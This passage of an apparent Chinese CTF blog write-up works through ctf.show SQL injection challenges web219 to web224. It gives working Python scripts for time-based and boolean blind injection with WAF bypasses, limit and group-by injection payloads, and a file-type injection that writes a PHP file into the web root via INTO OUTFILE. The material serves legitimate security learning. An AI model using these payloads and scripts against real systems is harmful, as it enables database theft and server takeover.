class="string">&quot;http://91f68e53-629c-42c8-9ba1-dc0fa6092341.challenge.ctf.show/api/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;1) or if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1) or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1) or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagxca&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;1) or if(ascii(substr((select flagaabc from ctfshow_flagxca),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span> : payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span> : <span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        end = time.time() - start</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> end &gt; <span class="number">2.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//屏蔽危险分子</span><br><span class="line">function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#x27;,$str);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>

<p>这里过滤还是挺多的，但是之前也学过绕过的方法了</p>
<p>字符集遍历绕过ascii就行，left+like绕过substr和mid，然后盲注的话用笛卡尔就行</p>
<p>试着写一下payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=1) or if(left(database(),&#123;i&#125;)= \&quot;&#123;flag+j&#125;\&quot;,(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#&amp;debug=1</span><br></pre></td></tr></table></figure>

<p>大概延迟6-7秒左右，不管了，慢点就慢点吧</p>
<p>但是发现这几个切片函数都不能和<code>group_concat</code>共用，用limit语句限制一下输出吧</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fcd017bc-038f-40e2-9f43-f2055436b4d9.challenge.ctf.show/api/&quot;</span></span><br><span class="line">strings=<span class="string">&quot;_-&#123;&#125;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    found = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strings:</span><br><span class="line">        <span class="comment">#payload = f&quot;1) or if(left(database(),&#123;i&#125;)= \&quot;&#123;target+j&#125;\&quot;,(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1) or if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;i&#125;)= \&quot;&#123;target+j&#125;\&quot;,(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1) or if(left((select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxcac&#x27; limit 1,1),&#123;i&#125;)= \&quot;&#123;target+j&#125;\&quot;,(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;1) or if(left((select flagaabcc from ctfshow_flagxcac limit 0,1),<span class="subst">&#123;i&#125;</span>)= \&quot;<span class="subst">&#123;target+j&#125;</span>\&quot;,(select count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G),0)#&quot;</span></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        end = time.time() - start</span><br><span class="line">        <span class="keyword">if</span> end &gt;= <span class="number">4</span>:</span><br><span class="line">            found = <span class="number">1</span></span><br><span class="line">            target += j</span><br><span class="line">            <span class="built_in">print</span>(target)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>

<h2 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h2><h3 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h3><h3 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h3><p>查询语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//分页查询</span><br><span class="line">$sql = select * from ctfshow_user limit ($page-1)*$limit,$limit;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>返回逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//TODO:很安全，不需要过滤</span><br><span class="line">//拿到数据库名字就算你赢</span><br></pre></td></tr></table></figure>

<p>这里的话就是limit注入了，这里有两个参数$page和$limit，测试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?page=1&amp;limit=1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)</span><br><span class="line">回显</span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u5931\u8d25XPATH syntax error: &#x27;~10.3.18-MariaDB&#x27;&quot;,&quot;count&quot;:&quot;0&quot;,&quot;data&quot;:[]&#125;</span><br></pre></td></tr></table></figure>

<p>拿数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?page=1&amp;limit=1 procedure analyse(extractvalue(rand(),concat(0x7e,database())),1)</span><br><span class="line">回显</span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u5931\u8d25XPATH syntax error: &#x27;~ctfshow_web_flag_x&#x27;&quot;,&quot;count&quot;:&quot;0&quot;,&quot;data&quot;:[]&#125;</span><br></pre></td></tr></table></figure>

<p>数据库名字就是flag</p>
<h3 id="group注入"><a href="#group注入" class="headerlink" title="group注入"></a>group注入</h3><h3 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h3><p>查询语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//分页查询</span><br><span class="line">$sql = select * from ctfshow_user group by $username;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>返回逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//TODO:很安全，不需要过滤</span><br></pre></td></tr></table></figure>

<p>group注入有两种，报错和延迟，这里的话没回显，直接打延迟，参数是u</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/?u=if(ascii(substr(database(),1,1))&gt;0,sleep(1),1)if(ascii(substr(database(),1,1))&gt;0,sleep(1),1)</span><br></pre></td></tr></table></figure>

<p>发现一共延迟了21s左右，估计有21条数据，我们用sleep(0.2)吧</p>
<p>写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ebfe1f77-39ae-4732-9e96-edfeb30a0bf9.challenge.ctf.show/api/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?u=if(ascii(substr((select database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.2),1)&quot;</span></span><br><span class="line">        <span class="comment">#数据库名ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?u=if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.2),1)&quot;</span></span><br><span class="line">        <span class="comment">#数据表名ctfshow_flaga</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?u=if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.2),1)&quot;</span></span><br><span class="line">        <span class="comment">#字段名flagaabc</span></span><br><span class="line">        payload = <span class="string">f&quot;?u=if(ascii(substr((select flagaabc from ctfshow_flaga),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.2),1)&quot;</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        end = time.time() - start</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> end &gt; <span class="number">3</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h3 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h3><p>这道题是过滤了数字的，用true去构造就行，但是这里sleep(true)的话又得跑好久，所以直接打布尔盲注</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=if(ascii(substr((select database()),&#123;real_i&#125;,true))&gt;&#123;real_mid&#125;,username,false)</span><br></pre></td></tr></table></figure>

<p>语句正确的回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?u=if(ascii(substr((select%20database()),true,true))&gt;false,username,false)</span><br><span class="line">返回</span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow&quot;,&quot;pass&quot;:&quot;ctfshow&quot;&#125;,&#123;&quot;id&quot;:&quot;2&quot;,&quot;username&quot;:&quot;user1&quot;,&quot;pass&quot;:&quot;111&quot;&#125;,&#123;&quot;id&quot;:&quot;3&quot;,&quot;username&quot;:&quot;user2&quot;,&quot;pass&quot;:&quot;222&quot;&#125;,&#123;&quot;id&quot;:&quot;4&quot;,&quot;username&quot;:&quot;userAUTO&quot;,&quot;pass&quot;:&quot;passwordAUTO&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>语句错误的回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?u=if(ascii(substr((select%20database()),true,true))&lt;false,username,false)</span><br><span class="line">返回</span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow&quot;,&quot;pass&quot;:&quot;ctfshow&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>然后写脚本就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1207941e-aa7a-4183-86da-2417300bb4e0.challenge.ctf.show/api/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line">        real_mid = createNum(mid)</span><br><span class="line">        real_i = createNum(i)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;if(ascii(substr(database(),&#123;real_i&#125;,true))&gt;&#123;real_mid&#125;,username,false)&quot;</span></span><br><span class="line">        <span class="comment">#数据库名ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = f&quot;if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),&#123;real_i&#125;,true))&gt;&#123;real_mid&#125;,username,false)&quot;</span></span><br><span class="line">        <span class="comment">#数据表名ctfshow_flagas</span></span><br><span class="line">        <span class="comment">#payload = f&quot;if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagas&#x27;),&#123;real_i&#125;,true))&gt;&#123;real_mid&#125;,username,false)&quot;</span></span><br><span class="line">        <span class="comment">#列名flagasabc</span></span><br><span class="line">        payload = <span class="string">f&quot;if(ascii(substr((select flagasabc from ctfshow_flagas),<span class="subst">&#123;real_i&#125;</span>,true))&gt;<span class="subst">&#123;real_mid&#125;</span>,username,false)&quot;</span></span><br><span class="line">        params=&#123;<span class="string">&quot;u&quot;</span>:payload&#125;</span><br><span class="line">        r=requests.get(url,params=params)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;passwordAUTO&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h3 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h3><p>一个登录界面</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250507185316118.png" alt="image-20250507185316118"></p>
<p>扫目录扫出来一个robots.txt文件，访问拿到&#x2F;pwdreset.php，重置一下密码然后登录就行，然后就是文件上传</p>
<p>fuzz一下一直没fuzz出来具体的绕过</p>
<p>看了 wp 是文件类型注入，后台会通过读取文件内容判断文件类型，记录到数据库，对文件进行重命名。</p>
<p>然后我们新建一个txt文件，写入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C64File &quot;&#x27;);select 0x3c3f3d20706870696e666f28293b3f3e into outfile &#x27;/var/www/html/test.php&#x27;;--+</span><br></pre></td></tr></table></figure>

<p>这里的话<code>0x3c3f3d20706870696e666f28293b3f3e</code>是<code>&lt;?= phpinfo();?&gt;</code>的十六进制</p>
<p>C64File 是与 Commodore 64 相关的文件类型，前边的C64File是为了绕过类型检测，之后闭合，写入 sql 语句，进行测试一下</p>
<p>访问filelist.php发现这里会对我们传入的文件进行重命名</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250507192231315.png" alt="image-20250507192231315"></p>
<p>访问我们刚刚传入的文件</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250507192406679.png" alt="image-20250507192406679"></p>
<p>成功执行，然后我们进行ls</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250507192617068.png" alt="image-20250507192617068"></p>
<p>想看一下check的机制是什么样的，读取upload.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Return Code: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">10</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;文件过大: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; Kb&lt;br /&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>))) . <span class="string">&quot;.zip&quot;</span>;</span><br><span class="line">    <span class="variable">$filetype</span> = (<span class="keyword">new</span> finfo)-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/image|png|bmap|jpg|jpeg|application|text|audio|video/i&quot;</span>, <span class="variable">$filetype</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;file type error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$filepath</span> = <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . <span class="variable">$filepath</span> . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . <span class="variable">$filetype</span> . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;ctf&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$con</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:filelist.php&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意这里的sql语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . <span class="variable">$filepath</span> . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . <span class="variable">$filetype</span> . <span class="string">&quot;&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这里可以看到filename和filepath都是不可控的，唯有filetype是可控的，然后我们看filetype的赋值机制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filetype = (new finfo)-&gt;file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br></pre></td></tr></table></figure>

<ul>
<li>finfo类：finfo是一个类，里面有方法open,file</li>
<li>finfo_open：finfo_open – finfo::__construct — 创建新 finfo 实例，这个函数的作用是打开一个文件，通常和finfo::file(finfo_file)在一起使用,</li>
<li>finfo_file:返回一个文件的信息</li>
</ul>
<p>本地测试一下</p>
